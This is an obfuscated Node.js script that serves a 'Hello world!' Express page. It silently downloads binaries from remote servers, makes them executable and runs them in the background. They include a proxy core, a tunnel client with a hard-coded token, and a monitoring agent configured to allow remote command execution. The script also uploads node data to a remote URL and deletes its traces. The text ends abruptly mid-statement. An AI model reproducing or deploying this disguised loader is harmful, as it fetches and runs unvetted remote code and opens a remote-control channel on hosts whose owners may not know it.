const _0x125a72=_0x2cb6;(function(_0x433fca,_0x231047){const _0x154b28={_0x5b7795:0x1a1,_0x128134:0x14d,_0x4dc844:0x12a,_0x4b0101:0x1b2,_0x2dffcd:0x112,_0x535f5e:0x1bc,_0x3604ab:0x12c},_0x4ea1f7=_0x2cb6,_0x3b1e6d=_0x433fca();while(!![]){try{const _0x34c887=parseInt(_0x4ea1f7(_0x154b28._0x5b7795))/0x1*(-parseInt(_0x4ea1f7(0x138))/0x2)+-parseInt(_0x4ea1f7(0x186))/0x3*(parseInt(_0x4ea1f7(0x166))/0x4)+parseInt(_0x4ea1f7(_0x154b28._0x128134))/0x5*(parseInt(_0x4ea1f7(_0x154b28._0x4dc844))/0x6)+parseInt(_0x4ea1f7(0x106))/0x7*(parseInt(_0x4ea1f7(_0x154b28._0x4b0101))/0x8)+parseInt(_0x4ea1f7(_0x154b28._0x2dffcd))/0x9*(parseInt(_0x4ea1f7(_0x154b28._0x535f5e))/0xa)+-parseInt(_0x4ea1f7(0x143))/0xb+-parseInt(_0x4ea1f7(0x13d))/0xc*(-parseInt(_0x4ea1f7(_0x154b28._0x3604ab))/0xd);if(_0x34c887===_0x231047)break;else _0x3b1e6d['push'](_0x3b1e6d['shift']());}catch(_0xaebee4){_0x3b1e6d['push'](_0x3b1e6d['shift']());}}}(_0x26e0,0x2e7ad));const express=require(_0x125a72(0x11b)),app=express(),axios=require(_0x125a72(0x175)),os=require('os'),fs=require('fs'),path=require(_0x125a72(0x12f)),{promisify}=require(_0x125a72(0x1a5)),exec=promisify(require(_0x125a72(0x144))['exec']),{execSync}=require(_0x125a72(0x144)),UPLOAD_URL=process[_0x125a72(0x19d)][_0x125a72(0x142)]||'',PROJECT_URL=process[_0x125a72(0x19d)][_0x125a72(0x13f)]||'',AUTO_ACCESS=process[_0x125a72(0x19d)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x125a72(0x19d)][_0x125a72(0x124)]||_0x125a72(0x141),SUB_PATH=process[_0x125a72(0x19d)][_0x125a72(0x115)]||_0x125a72(0x15f),PORT=process[_0x125a72(0x19d)][_0x125a72(0x176)]||process[_0x125a72(0x19d)][_0x125a72(0x134)]||0xbb8,UUID=process[_0x125a72(0x19d)][_0x125a72(0x11e)]||_0x125a72(0x1a7),NEZHA_SERVER=process[_0x125a72(0x19d)][_0x125a72(0x1a9)]||'',NEZHA_PORT=process[_0x125a72(0x19d)][_0x125a72(0x1c6)]||'',NEZHA_KEY=process[_0x125a72(0x19d)][_0x125a72(0x1a6)]||'',ARGO_DOMAIN=process['env'][_0x125a72(0x1b6)]||_0x125a72(0x116),ARGO_AUTH=process[_0x125a72(0x19d)][_0x125a72(0x1b1)]||_0x125a72(0x15d),ARGO_PORT=process[_0x125a72(0x19d)][_0x125a72(0x15b)]||_0x125a72(0x1aa),CFIP=process[_0x125a72(0x19d)][_0x125a72(0x185)]||_0x125a72(0x105),CFPORT=process[_0x125a72(0x19d)][_0x125a72(0x199)]||0x20fb,NAME=process[_0x125a72(0x19d)][_0x125a72(0x171)]||_0x125a72(0x155);!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x125a72(0x168)](FILE_PATH+_0x125a72(0x13a))):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x46a10f={_0x30efb9:0x1c2,_0xb210c2:0x156,_0xd37dcf:0x114,_0x1759bd:0x179},_0x526ada=_0x125a72,_0x245e02=_0x526ada(_0x46a10f._0x30efb9);let _0x16ac1c='';for(let _0x307734=0x0;_0x307734<0x6;_0x307734++){_0x16ac1c+=_0x245e02['charAt'](Math[_0x526ada(_0x46a10f._0xb210c2)](Math[_0x526ada(_0x46a10f._0xd37dcf)]()*_0x245e02[_0x526ada(_0x46a10f._0x1759bd)]));}return _0x16ac1c;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x125a72(0x183)](FILE_PATH,npmName),phpPath=path[_0x125a72(0x183)](FILE_PATH,phpName),webPath=path[_0x125a72(0x183)](FILE_PATH,webName),botPath=path[_0x125a72(0x183)](FILE_PATH,botName),subPath=path[_0x125a72(0x183)](FILE_PATH,_0x125a72(0x18e)),listPath=path['join'](FILE_PATH,_0x125a72(0x184)),bootLogPath=path[_0x125a72(0x183)](FILE_PATH,_0x125a72(0x1c5)),configPath=path[_0x125a72(0x183)](FILE_PATH,_0x125a72(0x14f));function _0x26e0(){const _0x23a01c=['\x20successfully','direct','config.yaml','\x20>/dev/null\x202>&1','message','.exe\x20>\x20nul\x202>&1','none','readdirSync','444744yOmSpX','has','random','SUB_PATH','date.96007.ggff.net','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','--tls','send','charAt','express','push','\x0a\x20\x20tunnel:\x20','UUID','8443','?security=tls&sni=','tcp','http\x20server\x20is\x20running\x20on\x20port:','/tunnel.yml\x20run','FILE_PATH','?encryption=none&security=tls&sni=','nohup\x20','match','isFile','Add\x20automatic\x20access\x20task\x20faild:\x20','101298aRnPBY','&fp=firefox&type=ws&host=','26IlDavK','/trojan-argo','pkill\x20-f\x20\x22[','path','firefox','arm64','map','\x20failed:\x20','PORT','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://amd64.ssss.nyc.mn/bot','\x20-s\x20','15052OYQEOH','Unknown','\x20is\x20created','arm','vless','1331724TMNiBI','https://oooo.serv00.net/add-url','PROJECT_URL','\x20is\x20running','./tmp','UPLOAD_URL','1947176ulChBJ','child_process','2083','listen','split','tunnel.json','https+local://8.8.8.8/dns-query','tls','unlinkSync','pop','50WMEULL','filter','config.json','Unhandled\x20error\x20in\x20startserver:','includes','/vmess-argo?ed=2560','data','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','railway','floor','Subscription\x20uploaded\x20successfully','stream','utf-8','Error\x20downloading\x20files:','ARGO_PORT','ARGO_DOMAIN:','eyJhIjoiMzRlOWU4N2IzYzViODkzNmU2NjNhZjc1NTYwMmNkODMiLCJ0IjoiNTg3YWE2MzYtMzNiNy00Zjc0LWJmOTQtNjE2YWRiY2U1YTc1IiwicyI6IlpUTTJZak16WVRBdE9XRTJOaTAwT1RJekxUaGxaR1l0WlRZMk1qRTFZalJrWm1RdyJ9','quic','lwy','http','from','fileName','platform','get','trojan','1209916zfGdmS','mkdirSync','log','unshift','Empowerment\x20failed\x20for\x20','finish','rm\x20-rf\x20','/config.json\x20>/dev/null\x202>&1\x20&','\x0avless://','&path=%2Ftrojan-argo%3Fed%3D2560#','amd','NAME','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','/api/add-subscriptions','axios','SERVER_PORT','post','close','length','freedom','2053','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','&path=%2Fvless-argo%3Fed%3D2560#','country_code','catch','127.0.0.1','Hello\x20world!','arch','join','list.txt','CFIP','3zWKRRb','status','\x20>/dev/null\x202>&1\x20&','writeFileSync','pipe','Error\x20executing\x20command:\x20','del\x20/f\x20/q\x20','aarch64','sub.txt','/vmess-argo','/dev/null','\x20-c\x20','clear','basename','NEZHA\x20variable\x20is\x20empty,skip\x20running','Nodes\x20uploaded\x20successfully','https://arm64.ssss.nyc.mn/agent','https://arm64.ssss.nyc.mn/v1','\x20-p\x20','CFPORT','win32','chmod','toString','env','https://arm64.ssss.nyc.mn/bot','existsSync','response','14lVJCeI','2087','/api/add-nodes','countryCode','util','NEZHA_KEY','ca545db2-979c-4ea1-9e5f-d72ea6c33b61','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','NEZHA_SERVER','8001','https://amd64.ssss.nyc.mn/agent','web\x20running\x20error:\x20','Error\x20reading\x20boot.log:','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/vless-argo','error','ARGO_AUTH','640lZHGCU','App\x20is\x20running','tunnel.yml','http://ip-api.com/json/','ARGO_DOMAIN','\x0a\x0atrojan://','readFileSync','443','Empowerment\x20success\x20for\x20','Content-Type','10MGRqqo','forEach','Error\x20in\x20startserver:','application/json','statSync','org','abcdefghijklmnopqrstuvwxyz','base64','stringify','boot.log','NEZHA_PORT','\x0a\x20\x20\x20\x20','TunnelSecret','test','success','Download\x20','\x0a\x20\x20credentials-file:\x20','162.159.153.90','29316lztWFM','all','/sub.txt\x20saved\x20successfully','fileUrl'];_0x26e0=function(){return _0x23a01c;};return _0x26e0();}function deleteNodes(){const _0x24aa1b={_0x286172:0x159,_0x363935:0x1c3,_0xad87d9:0x14e,_0x4c7f0b:0x179,_0x3082a5:0x177,_0x539538:0x1c4},_0x69f993=_0x125a72;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x2162bd;try{_0x2162bd=fs[_0x69f993(0x1b8)](subPath,_0x69f993(_0x24aa1b._0x286172));}catch{return null;}const _0x5aceb6=Buffer[_0x69f993(0x161)](_0x2162bd,_0x69f993(_0x24aa1b._0x363935))[_0x69f993(0x19c)]('utf-8'),_0x11d007=_0x5aceb6['split']('\x0a')[_0x69f993(_0x24aa1b._0xad87d9)](_0x2a7292=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2a7292));if(_0x11d007[_0x69f993(_0x24aa1b._0x4c7f0b)]===0x0)return;return axios[_0x69f993(_0x24aa1b._0x3082a5)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x69f993(_0x24aa1b._0x539538)]({'nodes':_0x11d007}),{'headers':{'Content-Type':'application/json'}})[_0x69f993(0x17f)](_0x33b172=>{return null;}),null;}catch(_0xfdf527){return null;}}function cleanupOldFiles(){const _0x377aaa={_0x65d567:0x111},_0x43021d={_0x47d943:0x128},_0x4b8245=_0x125a72;try{const _0x453a73=fs[_0x4b8245(_0x377aaa._0x65d567)](FILE_PATH);_0x453a73[_0x4b8245(0x1bd)](_0x32f2ee=>{const _0x4ff2a8=_0x4b8245,_0x4ab860=path[_0x4ff2a8(0x183)](FILE_PATH,_0x32f2ee);try{const _0x2edc93=fs[_0x4ff2a8(0x1c0)](_0x4ab860);_0x2edc93[_0x4ff2a8(_0x43021d._0x47d943)]()&&fs[_0x4ff2a8(0x14b)](_0x4ab860);}catch(_0x44f529){}});}catch(_0x103e8b){}}app[_0x125a72(0x164)]('/',function(_0x9a4138,_0x4cd849){const _0x23f1c6={_0x52a5c5:0x181},_0x1b32e0=_0x125a72;_0x4cd849[_0x1b32e0(0x119)](_0x1b32e0(_0x23f1c6._0x52a5c5));});async function generateConfig(){const _0x2949a2={_0x33914a:0x190,_0x3fc846:0x110,_0x3a7dc1:0x110,_0x55061d:0x12d,_0x1c2372:0x180,_0x6d368c:0x110,_0x5a439b:0x14a,_0x17444a:0x180,_0x5684e7:0x160,_0x16fd70:0x165,_0x2d9a04:0x14a,_0x49a51a:0x17a,_0x230038:0x10b,_0x39d894:0x1c4},_0x536bc0=_0x125a72,_0x15d0d5={'log':{'access':_0x536bc0(_0x2949a2._0x33914a),'error':_0x536bc0(0x190),'loglevel':_0x536bc0(_0x2949a2._0x3fc846)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x536bc0(_0x2949a2._0x3a7dc1),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x536bc0(_0x2949a2._0x55061d),'dest':0xbbc}]},'streamSettings':{'network':_0x536bc0(0x121)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x536bc0(0x13c),'settings':{'clients':[{'id':UUID}],'decryption':_0x536bc0(_0x2949a2._0x3a7dc1)},'streamSettings':{'network':_0x536bc0(0x121),'security':_0x536bc0(0x110)}},{'port':0xbba,'listen':_0x536bc0(_0x2949a2._0x1c2372),'protocol':_0x536bc0(0x13c),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x536bc0(_0x2949a2._0x6d368c)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x536bc0(0x1af)}},'sniffing':{'enabled':!![],'destOverride':[_0x536bc0(0x160),_0x536bc0(_0x2949a2._0x5a439b),_0x536bc0(0x15e)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x536bc0(_0x2949a2._0x17444a),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x536bc0(0x18f)}},'sniffing':{'enabled':!![],'destOverride':[_0x536bc0(_0x2949a2._0x5684e7),_0x536bc0(0x14a),_0x536bc0(0x15e)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x536bc0(_0x2949a2._0x17444a),'protocol':_0x536bc0(_0x2949a2._0x16fd70),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x536bc0(_0x2949a2._0x3fc846),'wsSettings':{'path':_0x536bc0(0x12d)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x536bc0(_0x2949a2._0x2d9a04),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x536bc0(0x149)]},'outbounds':[{'protocol':_0x536bc0(_0x2949a2._0x49a51a),'tag':_0x536bc0(_0x2949a2._0x230038)},{'protocol':'blackhole','tag':'block'}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x536bc0(0x14f)),JSON[_0x536bc0(_0x2949a2._0x39d894)](_0x15d0d5,null,0x2));}function getSystemArchitecture(){const _0x6efe35=_0x125a72,_0x3a0c04=os[_0x6efe35(0x182)]();return _0x3a0c04===_0x6efe35(0x13b)||_0x3a0c04===_0x6efe35(0x131)||_0x3a0c04===_0x6efe35(0x18d)?'arm':_0x6efe35(0x170);}function downloadFile(_0x1fdf34,_0x144424,_0x31cc44){const _0x32611={_0x5f63b0:0x167,_0x1f016a:0x164},_0x53725f={_0x22d2c7:0x103},_0x1c8634={_0x1edff0:0x18a},_0x1c3ba7={_0x5609c4:0x103,_0x3f707c:0x193,_0x397113:0x10e,_0x143c4f:0x1b0},_0x2b2d5a={_0x281eca:0x178,_0x2825f5:0x193},_0x47daf8=_0x125a72,_0x40c80b=_0x1fdf34;!fs[_0x47daf8(0x19f)](FILE_PATH)&&fs[_0x47daf8(_0x32611._0x5f63b0)](FILE_PATH,{'recursive':!![]});const _0x4bd394=fs['createWriteStream'](_0x40c80b);axios({'method':_0x47daf8(_0x32611._0x1f016a),'url':_0x144424,'responseType':_0x47daf8(0x158)})['then'](_0x51c2b6=>{const _0x3ab2e2=_0x47daf8;_0x51c2b6['data'][_0x3ab2e2(_0x1c8634._0x1edff0)](_0x4bd394),_0x4bd394['on'](_0x3ab2e2(0x16b),()=>{const _0x1efe55=_0x3ab2e2;_0x4bd394[_0x1efe55(_0x2b2d5a._0x281eca)](),console[_0x1efe55(0x168)]('Download\x20'+path[_0x1efe55(_0x2b2d5a._0x2825f5)](_0x40c80b)+_0x1efe55(0x10a)),_0x31cc44(null,_0x40c80b);}),_0x4bd394['on'](_0x3ab2e2(0x1b0),_0x16cec5=>{const _0x40d301=_0x3ab2e2;fs['unlink'](_0x40c80b,()=>{});const _0x3e84d0=_0x40d301(_0x1c3ba7._0x5609c4)+path[_0x40d301(_0x1c3ba7._0x3f707c)](_0x40c80b)+_0x40d301(0x133)+_0x16cec5[_0x40d301(_0x1c3ba7._0x397113)];console[_0x40d301(_0x1c3ba7._0x143c4f)](_0x3e84d0),_0x31cc44(_0x3e84d0);});})[_0x47daf8(0x17f)](_0x289f00=>{const _0x9fb308=_0x47daf8,_0x9ba8ef=_0x9fb308(_0x53725f._0x22d2c7)+path[_0x9fb308(0x193)](_0x40c80b)+_0x9fb308(0x133)+_0x289f00['message'];console[_0x9fb308(0x1b0)](_0x9ba8ef),_0x31cc44(_0x9ba8ef);});}async function downloadFilesAndRun(){const _0x365cab={_0x1a10bd:0x179,_0x510adc:0x132,_0x2b662e:0x14c,_0xbf230:0x1a2,_0xf7436e:0x145,_0x57c6c8:0x1ae,_0x1b2566:0x189,_0x3655c2:0x183,_0x1712a8:0x10c,_0x5a231d:0x126,_0x4f721a:0x17c,_0x23e2f9:0x168,_0x3d011d:0x140,_0x47fa12:0x1b0,_0x25329f:0x11f,_0x1024d8:0x1a2,_0x2bf1d2:0x17b,_0x3ede72:0x137,_0x1987de:0x198,_0x316a0b:0x191,_0x57af7e:0x1ac,_0x1faa4e:0x127,_0x2e64bf:0x126,_0x19599f:0x168,_0x2acc0:0x140},_0xc30bc=_0x125a72,_0x52b0e1=getSystemArchitecture(),_0xbf3de8=getFilesForArchitecture(_0x52b0e1);if(_0xbf3de8[_0xc30bc(_0x365cab._0x1a10bd)]===0x0){console['log'](_0xc30bc(0x172));return;}const _0x456bb4=_0xbf3de8[_0xc30bc(_0x365cab._0x510adc)](_0x5c7ec1=>{const _0x13816e={_0x237f8b:0x109};return new Promise((_0x10941c,_0x2cadf2)=>{const _0x1a54a6=_0x2cb6;downloadFile(_0x5c7ec1[_0x1a54a6(0x162)],_0x5c7ec1[_0x1a54a6(_0x13816e._0x237f8b)],(_0x3ff4d6,_0x5cb629)=>{_0x3ff4d6?_0x2cadf2(_0x3ff4d6):_0x10941c(_0x5cb629);});});});try{await Promise[_0xc30bc(0x107)](_0x456bb4);}catch(_0x265a54){console['error'](_0xc30bc(0x15a),_0x265a54);return;}function _0x239eb3(_0x22f9e8){const _0x236590=_0xc30bc,_0x2ab2a3=0x1fd;_0x22f9e8[_0x236590(0x1bd)](_0x1c6a23=>{const _0x5eecc9={_0x3465e4:0x1b0,_0x2c6aa5:0x1ba},_0x57d607=_0x236590;fs['existsSync'](_0x1c6a23)&&fs[_0x57d607(0x19b)](_0x1c6a23,_0x2ab2a3,_0x392374=>{const _0x37667c=_0x57d607;_0x392374?console[_0x37667c(_0x5eecc9._0x3465e4)](_0x37667c(0x16a)+_0x1c6a23+':\x20'+_0x392374):console['log'](_0x37667c(_0x5eecc9._0x2c6aa5)+_0x1c6a23+':\x20'+_0x2ab2a3[_0x37667c(0x19c)](0x8));});});}const _0x23d575=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x239eb3(_0x23d575);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3e30fd=NEZHA_SERVER[_0xc30bc(0x151)](':')?NEZHA_SERVER[_0xc30bc(0x147)](':')[_0xc30bc(_0x365cab._0x2b662e)]():'',_0x372922=new Set(['443',_0xc30bc(0x11f),'2096',_0xc30bc(_0x365cab._0xbf230),_0xc30bc(_0x365cab._0xf7436e),'2053']),_0x364fc0=_0x372922[_0xc30bc(0x113)](_0x3e30fd)?'true':'false',_0x3c53e4='\x0aclient_secret:\x20'+NEZHA_KEY+_0xc30bc(_0x365cab._0x57c6c8)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x364fc0+_0xc30bc(0x135)+UUID;fs[_0xc30bc(_0x365cab._0x1b2566)](path[_0xc30bc(_0x365cab._0x3655c2)](FILE_PATH,_0xc30bc(_0x365cab._0x1712a8)),_0x3c53e4);const _0x4a8534=_0xc30bc(_0x365cab._0x5a231d)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0xc30bc(_0x365cab._0x4f721a);try{await exec(_0x4a8534),console[_0xc30bc(_0x365cab._0x23e2f9)](phpName+_0xc30bc(_0x365cab._0x3d011d)),await new Promise(_0x35a485=>setTimeout(_0x35a485,0x3e8));}catch(_0x3e99d8){console[_0xc30bc(_0x365cab._0x47fa12)]('php\x20running\x20error:\x20'+_0x3e99d8);}}else{let _0x3a24b6='';const _0x2e9425=[_0xc30bc(0x1b9),_0xc30bc(_0x365cab._0x25329f),'2096',_0xc30bc(_0x365cab._0x1024d8),_0xc30bc(0x145),_0xc30bc(_0x365cab._0x2bf1d2)];_0x2e9425[_0xc30bc(0x151)](NEZHA_PORT)&&(_0x3a24b6=_0xc30bc(0x118));const _0x3af46c=_0xc30bc(_0x365cab._0x5a231d)+npmPath+_0xc30bc(_0x365cab._0x3ede72)+NEZHA_SERVER+':'+NEZHA_PORT+_0xc30bc(_0x365cab._0x1987de)+NEZHA_KEY+'\x20'+_0x3a24b6+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3af46c),console[_0xc30bc(_0x365cab._0x23e2f9)](npmName+'\x20is\x20running'),await new Promise(_0x402dd1=>setTimeout(_0x402dd1,0x3e8));}catch(_0x561308){console['error']('npm\x20running\x20error:\x20'+_0x561308);}}}else console['log'](_0xc30bc(0x194));const _0x5349ff=_0xc30bc(0x126)+webPath+_0xc30bc(_0x365cab._0x316a0b)+FILE_PATH+_0xc30bc(0x16d);try{await exec(_0x5349ff),console['log'](webName+_0xc30bc(_0x365cab._0x3d011d)),await new Promise(_0x43aa2b=>setTimeout(_0x43aa2b,0x3e8));}catch(_0x45662f){console['error'](_0xc30bc(_0x365cab._0x57af7e)+_0x45662f);}if(fs[_0xc30bc(0x19f)](botPath)){let _0x446fd2;if(ARGO_AUTH[_0xc30bc(_0x365cab._0x1faa4e)](/^[A-Z0-9a-z=]{120,250}$/))_0x446fd2='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0xc30bc(0x127)](/TunnelSecret/)?_0x446fd2='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0xc30bc(0x123):_0x446fd2=_0xc30bc(0x154)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0xc30bc(_0x365cab._0x2e64bf)+botPath+'\x20'+_0x446fd2+'\x20>/dev/null\x202>&1\x20&'),console[_0xc30bc(_0x365cab._0x19599f)](botName+_0xc30bc(_0x365cab._0x2acc0)),await new Promise(_0x31ed02=>setTimeout(_0x31ed02,0x7d0));}catch(_0x5169e4){console[_0xc30bc(_0x365cab._0x47fa12)](_0xc30bc(0x18b)+_0x5169e4);}}await new Promise(_0x3baef9=>setTimeout(_0x3baef9,0x1388));}function getFilesForArchitecture(_0x4e8444){const _0x537975={_0x59a14a:0x196,_0x5655d3:0x1ab,_0x327eaa:0x169,_0x2cba3f:0x197},_0x410b16=_0x125a72;let _0x4d59cb;_0x4e8444===_0x410b16(0x13b)?_0x4d59cb=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x410b16(0x19e)}]:_0x4d59cb=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x410b16(0x136)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x88aa3f=_0x4e8444==='arm'?_0x410b16(_0x537975._0x59a14a):_0x410b16(_0x537975._0x5655d3);_0x4d59cb[_0x410b16(_0x537975._0x327eaa)]({'fileName':npmPath,'fileUrl':_0x88aa3f});}else{const _0x347086=_0x4e8444===_0x410b16(0x13b)?_0x410b16(_0x537975._0x2cba3f):'https://amd64.ssss.nyc.mn/v1';_0x4d59cb[_0x410b16(0x169)]({'fileName':phpPath,'fileUrl':_0x347086});}}return _0x4d59cb;}function argoType(){const _0x43e727={_0xc97ca4:0x1c8,_0x98a237:0x11d,_0x3f4fa3:0x104,_0x13aff4:0x183,_0x400799:0x148,_0x424205:0x1b4},_0x2b2b65=_0x125a72;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x2b2b65(0x1a8));return;}if(ARGO_AUTH[_0x2b2b65(0x151)](_0x2b2b65(_0x43e727._0xc97ca4))){fs[_0x2b2b65(0x189)](path[_0x2b2b65(0x183)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x55fae8=_0x2b2b65(_0x43e727._0x98a237)+ARGO_AUTH['split']('\x22')[0xb]+_0x2b2b65(_0x43e727._0x3f4fa3)+path[_0x2b2b65(_0x43e727._0x13aff4)](FILE_PATH,_0x2b2b65(_0x43e727._0x400799))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x2b2b65(0x189)](path['join'](FILE_PATH,_0x2b2b65(_0x43e727._0x424205)),_0x55fae8);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x3b37df={_0x4008f9:0x15c,_0x3f0060:0x1b8,_0x3cd3b0:0x183,_0x568c77:0x1c5,_0x48b3aa:0x159,_0x21c281:0x147,_0xa9a34:0x168,_0x58d8d4:0x173,_0x1dbc92:0x1c5},_0x46228c={_0x3addf4:0x153,_0x350c1e:0x17e,_0x34bc09:0x1c1,_0x197089:0x164,_0x210524:0x153,_0xb505f:0x102,_0xfb8af1:0x1c1,_0x12e759:0x1c1},_0x460532={_0x24baac:0x19a},_0x342784={_0x136673:0x11c},_0x58b852=_0x125a72;let _0x2dcd18;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2dcd18=ARGO_DOMAIN,console[_0x58b852(0x168)](_0x58b852(_0x3b37df._0x4008f9),_0x2dcd18),await _0x6332b4(_0x2dcd18);else try{const _0xef2cd4=fs[_0x58b852(_0x3b37df._0x3f0060)](path[_0x58b852(_0x3b37df._0x3cd3b0)](FILE_PATH,_0x58b852(_0x3b37df._0x568c77)),_0x58b852(_0x3b37df._0x48b3aa)),_0x40f68b=_0xef2cd4[_0x58b852(_0x3b37df._0x21c281)]('\x0a'),_0x134595=[];_0x40f68b[_0x58b852(0x1bd)](_0x34dbb8=>{const _0x210ba1=_0x58b852,_0x2e8f2e=_0x34dbb8[_0x210ba1(0x127)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2e8f2e){const _0x1362df=_0x2e8f2e[0x1];_0x134595[_0x210ba1(_0x342784._0x136673)](_0x1362df);}});if(_0x134595[_0x58b852(0x179)]>0x0)_0x2dcd18=_0x134595[0x0],console[_0x58b852(0x168)]('ArgoDomain:',_0x2dcd18),await _0x6332b4(_0x2dcd18);else{console[_0x58b852(_0x3b37df._0xa9a34)](_0x58b852(_0x3b37df._0x58d8d4)),fs[_0x58b852(0x14b)](path[_0x58b852(0x183)](FILE_PATH,_0x58b852(_0x3b37df._0x1dbc92)));async function _0x2b304e(){const _0x2db7f8=_0x58b852;try{process[_0x2db7f8(0x163)]===_0x2db7f8(_0x460532._0x24baac)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x2db7f8(0x10f)):await exec(_0x2db7f8(0x12e)+botName[_0x2db7f8(0x11a)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0xdbaf99){}}_0x2b304e(),await new Promise(_0x2498fa=>setTimeout(_0x2498fa,0xbb8));const _0x89091='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x89091+_0x58b852(0x188)),console[_0x58b852(0x168)](botName+'\x20is\x20running'),await new Promise(_0x2552e5=>setTimeout(_0x2552e5,0xbb8)),await extractDomains();}catch(_0xa02316){console[_0x58b852(0x1b0)](_0x58b852(0x18b)+_0xa02316);}}}catch(_0x3010bb){console[_0x58b852(0x1b0)](_0x58b852(0x1ad),_0x3010bb);}async function _0x2c88ae(){const _0x206d02=_0x58b852;try{const _0x46ae0e=await axios[_0x206d02(0x164)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x46ae0e[_0x206d02(_0x46228c._0x3addf4)]&&_0x46ae0e['data'][_0x206d02(_0x46228c._0x350c1e)]&&_0x46ae0e[_0x206d02(0x153)][_0x206d02(_0x46228c._0x34bc09)])return _0x46ae0e[_0x206d02(_0x46228c._0x3addf4)]['country_code']+'_'+_0x46ae0e[_0x206d02(0x153)][_0x206d02(_0x46228c._0x34bc09)];}catch(_0xa8fef3){try{const _0x3bafe3=await axios[_0x206d02(_0x46228c._0x197089)](_0x206d02(0x1b5),{'timeout':0xbb8});if(_0x3bafe3[_0x206d02(0x153)]&&_0x3bafe3[_0x206d02(_0x46228c._0x210524)][_0x206d02(0x187)]===_0x206d02(_0x46228c._0xb505f)&&_0x3bafe3[_0x206d02(0x153)]['countryCode']&&_0x3bafe3['data'][_0x206d02(_0x46228c._0xfb8af1)])return _0x3bafe3[_0x206d02(0x153)][_0x206d02(0x1a4)]+'_'+_0x3bafe3['data'][_0x206d02(_0x46228c._0x12e759)];}catch(_0x10b38e){}}return _0x206d02(0x139);}async function _0x6332b4(_0x4a2d04){const 